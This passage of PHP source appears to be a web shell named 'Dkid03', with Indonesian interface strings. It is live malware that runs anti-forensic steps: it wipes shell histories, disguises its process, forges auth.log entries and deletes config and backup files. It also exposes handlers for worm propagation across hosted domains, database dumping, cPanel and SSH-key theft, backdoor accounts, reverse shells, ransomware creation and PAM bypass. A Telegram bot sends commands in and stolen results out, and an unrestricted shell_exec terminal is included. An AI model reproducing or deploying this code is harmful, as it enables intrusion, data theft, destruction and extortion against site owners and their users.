                if (file_exists($path)) { @file_put_contents($path, ''); $cleared_hist++; }
            }
        }
        $results[] = "✅ Histories Cleared: $cleared_hist files";
    }
    
    // 5. HIDE PROCESS
    $pid = getmypid();
    $fake = ['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd'][array_rand(['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd'])];
    if (function_exists('cli_set_process_title')) cli_set_process_title($fake);
    @shell_exec("echo '$fake' > /proc/$pid/comm 2>/dev/null");
    $results[] = "✅ Process Hidden as: $fake";
    
    // 6. CHANGE TIMESTAMP
    $old_time = strtotime('2020-01-01') + rand(0, 31536000);
    @touch(__FILE__, $old_time, $old_time);
    $results[] = "✅ File Timestamp Changed";
    
    // 7. FAKE LOGIN
    $fake_ip = ['192.168.1.100', '10.0.0.50', '172.16.0.25'][array_rand(['192.168.1.100', '10.0.0.50', '172.16.0.25'])];
    $fake_user = ['root', 'admin', 'user'][array_rand(['root', 'admin', 'user'])];
    $fake_time = date('Y-m-d H:i:s', time() - rand(3600, 86400));
    foreach (['/var/log/auth.log', '/var/log/secure'] as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, "$fake_time $fake_user login from $fake_ip\n", FILE_APPEND);
            $results[] = "✅ Fake Login Created: $fake_user from $fake_ip";
            break;
        }
    }
    
    // 8. DELETE TEMP
    $deleted_temp = 0;
    foreach (['/tmp/', '/var/tmp/'] as $dir) {
        if (is_dir($dir)) {
            $files = @glob($dir . '*.tmp');
            if ($files !== false) foreach ($files as $file) if (@unlink($file)) $deleted_temp++;
        }
    }
    $results[] = "✅ Temp Files Deleted: $deleted_temp files";
    
    // 9. REMOVE SENSITIVE
    $sensitive = ['/.env', '/wp-config.php', '/config.php', '/database.php', '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak'];
    $roots = get_all_document_roots_cached();
    $deleted_sensitive = 0;
    foreach ($roots as $root) {
        foreach ($sensitive as $pattern) {
            $files = @glob($root . $pattern);
            if ($files !== false) {
                foreach ($files as $file) {
                    if (is_file($file) && is_writable($file) && strpos($file, basename(__FILE__)) === false) {
                        @unlink($file);
                        $deleted_sensitive++;
                    }
                }
            }
        }
    }
    $results[] = "✅ Sensitive Files Removed: $deleted_sensitive files";
    
    // 10. KILL CONNECTIONS
    if (function_exists('shell_exec') && isRoot()) {
        @shell_exec('pkill -9 -f "http|ssh|ftp|mysql" 2>/dev/null');
        $results[] = "✅ Active connections killed";
    }
    
    // 11. CLEAR PHP TEMP
    $php_tmp = @glob('/tmp/*.php');
    if ($php_tmp !== false) {
        foreach ($php_tmp as $file) {
            if (strpos($file, basename(__FILE__)) === false) {
                @unlink($file);
            }
        }
        $results[] = "✅ Temp PHP files cleaned";
    }
    
    // 12. CLEAR SYSTEM CACHE
    if (function_exists('shell_exec')) {
        @shell_exec('sync 2>/dev/null');
        @shell_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
        $results[] = "✅ System cache dropped";
    }
    
    $execution_time = round(microtime(true) - $start_time, 2);
    $results[] = "⏱️ Execution time: $execution_time seconds";
    
    $msg = "💀 *ONE CLICK ALL (TANPA WORM) COMPLETED*\n\n"
         . "Total actions: " . count($results) . "\n"
         . "Execution time: $execution_time seconds\n\n"
         . "📋 Details:\n" . implode("\n", $results);
    
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

// ==================== HANDLER GET ====================
if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    worm_spread_to_domains(__FILE__);
    echo "🪱 Worm spread executed. Check Telegram.";
    exit;
}

if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = worm_infect_all_domains(__FILE__);
    echo "🪱 Worm infect all domains selesai. " . count($result['infected']) . " direktori terinfeksi. Check Telegram.";
    exit;
}

if (isset($_GET['one_click_no_worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
        one_click_all_without_worm();
        echo "💀 ONE CLICK (Tanpa Worm) EXECUTED! Check Telegram.";
    } else {
        echo "⚠️ Confirm with: ?one_click_no_worm=1&confirm=yes";
    }
    exit;
}

if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    dump_databases();
    echo "💾 Database dump executed. Check Telegram.";
    exit;
}

if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    find_sensitive_files();
    echo "🔍 Config finder executed. Check Telegram.";
    exit;
}

if (isset($_GET['harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    cpanel_harvest();
    echo "🔑 Harvest executed. Check Telegram.";
    exit;
}

if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    clean_traces();
    echo "🧹 Traces cleaned. Check Telegram.";
    exit;
}

if (isset($_GET['backdooruser']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $user = $_GET['user'] ?? '';
    $pass = $_GET['pass'] ?? '';
    echo create_backdoor_user($user, $pass);
    exit;
}

if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['action'] ?? '';
    $ip = $_GET['ip'] ?? '';
    $port = $_GET['port'] ?? '';
    if ($action == 'start') { start_reverse_shell($ip, $port); echo "✅ Reverse shell started."; }
    elseif ($action == 'stop') echo stop_reverse_shell($port);
    elseif ($action == 'status') echo status_reverse_shell();
    exit;
}

if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    echo clean_logs_advanced();
    exit;
}

if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    grab_ssh_keys();
    echo "🔑 SSH keys grabbed. Check Telegram.";
    exit;
}

if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    scan_wordpress_laravel();
    echo "📊 WP Scan executed. Check Telegram.";
    exit;
}

if (isset($_GET['create_ransom']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    create_ransomware();
    echo "💀 Ransomware created. Check Telegram.";
    exit;
}

if (isset($_GET['selfdestruct']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
        self_destruct_ultimate();
    } else {
        echo "⚠️ Confirm with: ?selfdestruct=1&confirm=yes";
    }
    exit;
}

if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = anti_forensic_ultimate();
    echo $result['msg'];
    exit;
}

if (isset($_GET['bypass_suhosin']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = bypass_suhosin();
    echo $result['msg'];
    exit;
}

if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $user = $_GET['user'] ?? 'ftpuser';
    $pass = $_GET['pass'] ?? 'password123';
    $home = $_GET['home'] ?? '/home/' . $user;
    $result = create_ftp_account($user, $pass, $home);
    echo $result['msg'];
    exit;
}

if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $email = $_GET['email'] ?? 'user@' . $_SERVER['HTTP_HOST'];
    $pass = $_GET['pass'] ?? 'password123';
    $domain = $_GET['domain'] ?? $_SERVER['HTTP_HOST'];
    $result = create_mail_account($email, $pass, $domain);
    echo $result['msg'];
    exit;
}

if (isset($_GET['deep_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['deep_persistence'];
    $result = $action === 'install' ? install_deep_persistence() : remove_deep_persistence();
    echo $result['msg'];
    exit;
}

if (isset($_GET['pam_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['pam_bypass'];
    $password = $_GET['password'] ?? 'BackdoorPass123';
    $result = $action === 'install' ? pam_bypass_install($password) : pam_bypass_remove();
    echo $result['msg'];
    exit;
}

if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['user_persistence'];
    $result = $action === 'install' ? user_persistence_install() : user_persistence_remove();
    echo $result['msg'];
    exit;
}

if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    list_spread_files();
    echo "📋 List spread files sent to Telegram.";
    exit;
}

if (isset($_GET['cache_repair']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    system_cache_repair();
    echo "✅ System cache repaired.";
    exit;
}

if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['action'] ?? 'list';
    $username = $_GET['user'] ?? '';
    $extra = $_GET['extra'] ?? '';
    $result = cpanel_handler($action, $username, $extra);
    sendTelegramMessage($botToken, $telegramUserId, "📋 *cPanel Result*\n\n" . $result);
    echo $result;
    exit;
}

// ==================== TELEGRAM COMMAND HANDLER ====================
function telegram_command_handler($botToken, $chatId) {
    if (!isset($_SESSION['telegram_offset'])) $_SESSION['telegram_offset'] = 0;
    
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates";
    $data = [
        'offset' => $_SESSION['telegram_offset'], 
        'timeout' => 10,
        'allowed_updates' => ['message']
    ];
    $postData = http_build_query($data);
    $result = false;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    
    if ($result === false) {
        if (ini_get('allow_url_fopen')) {
            $options = [
                'http' => [
                    'method' => 'POST',
                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                    'content' => $postData,
                    'timeout' => 10
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ];
            $context = stream_context_create($options);
            $result = @file_get_contents($url, false, $context);
        }
    }
    
    if ($result === false) return;
    
    $updates = json_decode($result, true);
    if (!isset($updates['ok']) || !$updates['ok'] || empty($updates['result'])) return;
    
    foreach ($updates['result'] as $update) {
        $_SESSION['telegram_offset'] = $update['update_id'] + 1;
        
        if (!isset($update['message']['text'])) continue;
        if ($update['message']['chat']['id'] != $chatId) continue;
        
        $cmd = $update['message']['text'];
        $parts = explode(' ', $cmd);
        $command = strtolower($parts[0]);
        $param = $parts[1] ?? '';
        $param2 = $parts[2] ?? '';
        $param3 = $parts[3] ?? '';
        $response = '';
        
        switch ($command) {
            case '/start':
            case '/help':
                $response = "💀 *Dkid03 Bot*\n\n"
                          . "📂 /ls [dir]\n"
                          . "📥 /download [file]\n"
                          . "⚡ /exec [cmd]\n"
                          . "🪱 /worm\n"
                          . "🪱 /worminfectall\n"
                          . "🧹 /clean\n"
                          . "💾 /dumpdb\n"
                          . "🔑 /harvest\n"
                          . "🔍 /configfinder\n"
                          . "👤 /backdooruser [user] [pass]\n"
                          . "🔌 /reverseshell start/stop/status\n"
                          . "🔑 /sshkeys\n"
                          . "📊 /wpscan\n"
                          . "💀 /selfdestruct\n"
                          . "🧹 /antiforensic\n"
                          . "🛡️ /bypasssuhosin\n"
                          . "📂 /createftp [user] [pass]\n"
                          . "📧 /createmail [email] [pass]\n"
                          . "💀 /makeransom\n"
                          . "💀 /deeppersist install/remove\n"
                          . "🔑 /pambypass install/remove\n"
                          . "💀 /userpersist install/remove\n"
                          . "📋 /listspread\n"
                          . "🔄 /cache\n"
                          . "💀 /oneclicknoworm";
                break;
                
            case '/worm':
                $result = worm_spread_to_domains(__FILE__);
                $response = "🪱 *Worm Spread*\n\n✅ Berhasil: " . count($result) . " direktori terinfeksi.";
                break;
                
            case '/worminfectall':
                $result = worm_infect_all_domains(__FILE__);
                $response = "🪱 *Worm Infect All Domains*\n\n"
                          . "✅ Berhasil: " . count($result['infected']) . " direktori\n"
                          . "❌ Gagal: " . count($result['errors']) . "\n"
                          . "🔗 Links: " . count($result['links']) . " domain";
                break;
                
            case '/oneclicknoworm':
                one_click_all_without_worm();
                $response = "💀 ONE CLICK (Tanpa Worm) executed. Check Telegram for results.";
                break;
                
            default:
                $response = "❌ Perintah tidak dikenal. Ketik /help";
        }
        
        if (!empty($response)) {
            sendTelegramMessage($botToken, $chatId, $response);
        }
    }
}

// ==================== LOGIN OTP ====================
$loginError = $loginSuccess = '';

if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp;
    $_SESSION['otp_time'] = time();
    $message = "🔑 <b>Kode OTP Anda:</b>\n\n<code>$otp</code>\n\n⏱️ Berlaku 5 menit.";
    $sent = sendTelegramMessage($botToken, $telegramUserId, $message);
    if ($sent) $loginSuccess = "✅ OTP telah dikirim ke Telegram.";
    else { $loginError = "❌ Gagal mengirim OTP."; unset($_SESSION['otp']); }
}

if (isset($_POST['verify_otp'])) {
    $inputOtp = trim($_POST['otp'] ?? '');
    if (empty($inputOtp)) $loginError = "Masukkan kode OTP.";
    elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) $loginError = "Minta OTP dulu.";
    elseif (time() - $_SESSION['otp_time'] > 300) {
        $loginError = "❌ Kode kadaluarsa.";
        unset($_SESSION['otp'], $_SESSION['otp_time']);
    } elseif ($inputOtp === $_SESSION['otp']) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        unset($_SESSION['otp'], $_SESSION['otp_time']);
        header('Location: ?');
        exit;
    } else $loginError = "❌ Kode OTP salah.";
}

// ==================== AREA LOGGED IN ====================
if (isset($_SESSION['loggedin'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header('Location: ?');
        exit;
    }
    
    telegram_command_handler($botToken, $telegramUserId);
    
    $currentPath = $rootPath;
    if (isset($_GET['path'])) {
        $requestedPath = realpath($_GET['path']);
        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) {
            $currentPath = $requestedPath;
        } else {
            $error = "Path tidak valid";
        }
    }
    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) {
        $error = "Direktori tidak dapat diakses";
        $currentPath = $rootPath;
    }
    
    // ===== HANDLER POST =====
    
    // CREATE FILE / FOLDER
    if (isset($_POST['create']) && isset($_POST['type']) && isset($_POST['name'])) {
        try {
            $type = $_POST['type'];
            $name = trim($_POST['name']);
            
            if (empty($name)) throw new Exception('Nama tidak boleh kosong');
            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) throw new Exception('Nama mengandung karakter tidak valid');
            
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newPath)) throw new Exception('File/folder sudah ada: ' . $name);
            
            if ($type === 'file') {
                if (@touch($newPath)) {
                    @chmod($newPath, 0644);
                    $success = '✅ File berhasil dibuat: ' . $name;
                } else {
                    throw new Exception('Gagal membuat file: ' . $name);
                }
            } elseif ($type === 'folder') {
                if (@mkdir($newPath, 0755, true)) {
                    $success = '✅ Folder berhasil dibuat: ' . $name;
                } else {
                    throw new Exception('Gagal membuat folder: ' . $name);
                }
            } else {
                throw new Exception('Tipe tidak valid');
            }
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // UPLOAD FILE
    if (isset($_FILES['upload']) && !empty($_FILES['upload']['name'][0])) {
        try {
            if (!is_writable($currentPath)) throw new Exception('Direktori tidak dapat ditulisi');
            
            $mode = $_POST['upload_mode'] ?? 'normal';
            $targetDirs = [$currentPath];
            if ($mode === 'bulk_shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            elseif ($mode === 'bulk_deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            $targetDirs = array_filter($targetDirs, 'is_writable');
            
            $uploadedFiles = [];
            $errors = [];
            $fileCount = count($_FILES['upload']['name']);
            
            for ($i = 0; $i < $fileCount; $i++) {
                if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) {
                    $errors[] = "Error upload file " . ($i+1);
                    continue;
                }
                
                $safeName = basename($_FILES['upload']['name'][$i]);
                $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
                
                if (file_exists($mainTarget)) {
                    $errors[] = "File sudah ada: $safeName";
                    continue;
                }
                
                if (@move_uploaded_file($_FILES['upload']['tmp_name'][$i], $mainTarget)) {
                    @chmod($mainTarget, 0644);
                    $uploadedFiles[] = $safeName;
                    
                    foreach ($targetDirs as $dir) {
                        if ($dir !== $currentPath) {
                            @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
                            @chmod($dir . DIRECTORY_SEPARATOR . $safeName, 0644);
                        }
                    }
                } else {
                    $errors[] = "Gagal upload: $safeName";
                }
            }
            
            if (!empty($uploadedFiles)) {
                $success = '✅ File berhasil diupload: ' . implode(', ', $uploadedFiles);
                if (!empty($errors)) $success .= "\n⚠️ Error: " . implode(', ', $errors);
            } else {
                throw new Exception('Tidak ada file yang berhasil diupload');
            }
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // BULK DELETE
    if (isset($_POST['delete_bulk']) && isset($_POST['file_list'])) {
        try {
            $fileList = $_POST['file_list'] ?? '';
            $deleteMode = $_POST['delete_mode'] ?? 'current';
            
            if (empty(trim($fileList))) throw new Exception('Daftar file tidak boleh kosong');
            
            $files = preg_split('/[\n,]+/', trim($fileList));
            $files = array_filter(array_map('trim', $files));
            if (empty($files)) throw new Exception('Tidak ada file yang valid');
            
            $targetDirs = [$currentPath];
            if ($deleteMode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            elseif ($deleteMode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            $targetDirs = array_filter($targetDirs, 'is_dir');
            
            $deleted = [];
            $notFound = [];
            $errors = [];
            
            foreach ($targetDirs as $dir) {
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (strpos($path, '..') !== false) continue;
                    
                    if (is_file($path)) {
                        if (@unlink($path)) {
                            $deleted[] = $path;
                        } else {
                            @chmod($path, 0777);
                            if (@unlink($path)) $deleted[] = $path;
                            else $errors[] = $path;
                        }
                    } elseif (is_dir($path) && $file !== '.' && $file !== '..') {
                        if (deleteDirectory($path)) $deleted[] = $path . '/';
                        else $errors[] = $path . '/';
                    } elseif (!in_array($file, $notFound)) {
                        $notFound[] = $file;
                    }
                }
            }
            
            $msgParts = [];
            if (!empty($deleted)) $msgParts[] = 'Terhapus: ' . count($deleted) . ' file/dir';
            if (!empty($notFound)) $msgParts[] = 'Tidak ditemukan: ' . implode(', ', array_unique($notFound));
            if (!empty($errors)) $msgParts[] = 'Gagal dihapus: ' . count($errors) . ' file';
            if (empty($msgParts)) throw new Exception('Tidak ada yang dihapus');
            
            $success = '✅ Hasil hapus massal: ' . implode('; ', $msgParts);
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // RENAME
    if (isset($_POST['rename']) && isset($_POST['target']) && isset($_POST['new_name'])) {
        try {
            $target = $_POST['target'] ?? '';
            $newName = $_POST['new_name'] ?? '';
            
            if (empty($target) || empty($newName)) throw new Exception('Target dan nama baru harus diisi');
            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) throw new Exception('Nama mengandung karakter tidak valid');
            
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
            
            if (!file_exists($targetPath)) throw new Exception('File/folder tidak ditemukan');
            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
            if (file_exists($newPath)) throw new Exception('File/folder dengan nama tersebut sudah ada');
            if (!@rename($targetPath, $newPath)) throw new Exception('Gagal mengganti nama');
            
            $success = '✅ Berhasil rename: ' . $target . ' → ' . $newName;
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // SAVE FILE
    if (isset($_POST['save_file']) && isset($_POST['file']) && isset($_POST['content'])) {
        try {
            $file = $_POST['file'];
            $content = $_POST['content'];
            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
            
            if (!file_exists($filePath) || !is_file($filePath)) throw new Exception('File tidak ditemukan');
            if (!isSafePath($filePath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
            if (!is_writable($filePath)) throw new Exception('File tidak dapat ditulisi');
            if (@file_put_contents($filePath, $content) === false) throw new Exception('Gagal menyimpan file');
            
            $success = '✅ File berhasil disimpan: ' . $file;
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // ACTION (DELETE, CHMOD, DOWNLOAD)
    if (isset($_GET['action'])) {
        try {
            $action = $_GET['action'];
            $target = $_GET['target'] ?? '';
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            
            if (empty($target) || !file_exists($targetPath)) throw new Exception('Target tidak ditemukan');
            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
            
            switch ($action) {
                case 'delete':
                    if (deleteDirectory($targetPath)) $success = '✅ Berhasil menghapus: ' . $target;
                    else throw new Exception('Gagal menghapus: ' . $target);
                    break;
                    
                case 'chmod':
                    if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) throw new Exception('Mode permission tidak valid');
                    if (@chmod($targetPath, octdec($_POST['mode']))) $success = '✅ Berhasil mengubah permission: ' . $target . ' → ' . $_POST['mode'];
                    else throw new Exception('Gagal mengubah permission');
                    break;
                    
                case 'download':
                    if (is_dir($targetPath)) throw new Exception('Tidak dapat mendownload direktori');
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
                    header('Content-Length: ' . filesize($targetPath));
                    readfile($targetPath);
                    exit;
                    
                case 'unzip':
                    if (!class_exists('ZipArchive')) throw new Exception('Ekstensi Zip tidak tersedia');
                    $zip = new ZipArchive();
                    if ($zip->open($targetPath) === TRUE) {
                        $zip->extractTo($currentPath);
                        $zip->close();
                        $success = '✅ Berhasil mengekstrak: ' . $target;
                    } else {
                        throw new Exception('Gagal membuka file zip');
                    }
                    break;
                    
                default:
                    throw new Exception('Aksi tidak dikenali: ' . $action);
            }
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // TERMINAL
    $terminalActive = isTerminalActive();
    $terminalOutput = '';
    if (isset($_POST['run_command']) && $terminalActive) {
        $command = $_POST['command'] ?? '';
        if (!empty($command)) {
            $output = @shell_exec($command . ' 2>&1');
            $terminalOutput = $output !== null ? $output : 'Perintah tidak menghasilkan output.';
        }
    }
}

// ==================== HTML ====================
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dkid03</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #0d1117; --bg-card: #161b22; --bg-hover: #1f242f; --text: #c9d1d9; --text-muted: #8b949e; --accent: #58a6ff; --border: #30363d; --danger: #f85149; --success: #3fb950; --warning: #d29922; --radius: 6px; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:var(--bg); color:var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; line-height:1.6; min-height:100vh; }
        a { color:var(--accent); text-decoration:none; }
        a:hover { text-decoration:underline; }
        .login-container { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
        .login-box { background:var(--bg-card); padding:30px; border-radius:var(--radius); border:1px solid var(--border); max-width:400px; width:100%; }
        .login-title { text-align:center; margin-bottom:20px; font-size:1.5rem; font-weight:600; color:var(--accent); }
        .app-container { display:flex; min-height:100vh; }
        .main-content { flex:1; padding:20px; margin-left:220px; }
        @media(max-width:768px){ .main-content { margin-left:0; padding:10px; } }
        .sidebar { width:220px; background:var(--bg-card); border-right:1px solid var(--border); height:100vh; position:fixed; top:0; left:0; overflow-y:auto; display:flex; flex-direction:column; z-index:100; }
        .sidebar-header { padding:15px; border-bottom:1px solid var(--border); }
        .sidebar-title { font-size:1.1rem; font-weight:600; color:var(--accent); }
        .sidebar-subtitle { font-size:0.7rem; color:var(--text-muted); word-break:break-all; }
        .sidebar-menu { padding:10px; flex:1; }
        .menu-section { margin-bottom:12px; }
        .menu-title { font-size:0.6rem; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); padding:0 8px; margin-bottom:4px; }
        .menu-item { display:flex; align-items:center; gap:10px; padding:6px 12px; border-radius:var(--radius); color:var(--text); cursor:pointer; transition:0.2s; font-size:0.8rem; background:transparent; border:none; width:100%; text-align:left; }
        .menu-item:hover { background:var(--bg-hover); color:var(--accent); }
        .menu-item i { width:18px; text-align:center; font-size:0.85rem; }
        .logout-btn { color:var(--danger); margin-top:auto; }
        .logout-btn:hover { background:rgba(248,81,73,0.1); color:var(--danger); }
        .menu-toggle { display:none; position:fixed; top:10px; left:10px; z-index:999; background:var(--bg-card); border:1px solid var(--border); color:var(--text); border-radius:var(--radius); padding:8px 12px; cursor:pointer; font-size:0.9rem; }
        @media(max-width:768px){ .menu-toggle { display:block; } .sidebar { transform:translateX(-100%); width:260px; } .sidebar.active { transform:translateX(0); } }
        .card { background:var(--bg-card); border-radius:var(--radius); border:1px solid var(--border); margin-bottom:12px; overflow:hidden; }
        .card-header { padding:10px 14px; border-bottom:1px solid var(--border); font-weight:500; display:flex; justify-content:space-between; align-items:center; font-size:0.85rem; }
        .card-body { padding:10px 14px; max-height:55vh; overflow-y:auto; }
        .table { width:100%; border-collapse:collapse; font-size:0.8rem; }
        .table th { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); color:var(--text-muted); font-weight:500; position:sticky; top:0; background:var(--bg-card); }
        .table td { padding:4px 8px; border-bottom:1px solid var(--border); }
        .table tr:hover td { background:var(--bg-hover); }
        .folder { color:var(--accent); }
        .file { color:var(--text); }
        .file-icon { margin-right:4px; }
        .action-links { display:flex; gap:4px; flex-wrap:wrap; }
        .action-links a { font-size:0.7rem; color:var(--text-muted); padding:2px 6px; border-radius:4px; background:rgba(255,255,255,0.04); transition:0.2s; }
        .action-links a:hover { color:var(--accent); background:rgba(88,166,255,0.1); }
        .breadcrumb { padding:6px 0; font-size:0.75rem; color:var(--text-muted); overflow-x:auto; white-space:nowrap; }
        .breadcrumb a { color:var(--accent); }
        .form-group { margin-bottom:10px; }
        .form-group label { display:block; margin-bottom:3px; font-size:0.8rem; font-weight:500; }
        .form-control { width:100%; padding:6px 10px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); font-size:0.85rem; transition:0.2s; }
        .form-control:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(88,166,255,0.15); }
        .btn { display:inline-block; padding:6px 14px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); cursor:pointer; font-size:0.8rem; transition:0.2s; text-align:center; }
        .btn:hover { background:var(--bg-hover); border-color:var(--accent); color:var(--accent); }
        .btn-block { display:block; width:100%; }
        .btn-danger { border-color:var(--danger); color:var(--danger); }
        .btn-danger:hover { background:rgba(248,81,73,0.1); }
        .alert { padding:8px 12px; border-radius:var(--radius); margin-bottom:10px; font-size:0.85rem; }
        .alert-danger { background:rgba(248,81,73,0.1); border:1px solid var(--danger); color:var(--danger); }
        .alert-success { background:rgba(63,185,80,0.1); border:1px solid var(--success); color:var(--success); }
        .terminal-output { background:var(--bg); padding:10px; border-radius:var(--radius); font-family:'Courier New',monospace; font-size:0.75rem; max-height:250px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border); margin-bottom:8px; }
        .terminal-input { display:flex; gap:6px; flex-wrap:wrap; }
        .terminal-input .form-control { flex:1; min-width:120px; }
        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:1000; opacity:0; visibility:hidden; transition:0.25s; }
        .modal.active { opacity:1; visibility:visible; }
        .modal-content { background:var(--bg-card); border-radius:var(--radius); max-width:500px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid var(--border); transform:translateY(15px); transition:0.25s; }
        .modal.active .modal-content { transform:translateY(0); }
        .modal-header { padding:12px 16px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
        .modal-title { font-size:1rem; font-weight:600; color:var(--accent); }
        .modal-close { background:none; border:none; color:var(--text-muted); font-size:1.2rem; cursor:pointer; padding:0 4px; }
        .modal-close:hover { color:var(--text); }
        .modal-body { padding:16px; }
        ::-webkit-scrollbar { width:5px; height:5px; }
        ::-webkit-scrollbar-track { background:var(--bg); }
        ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
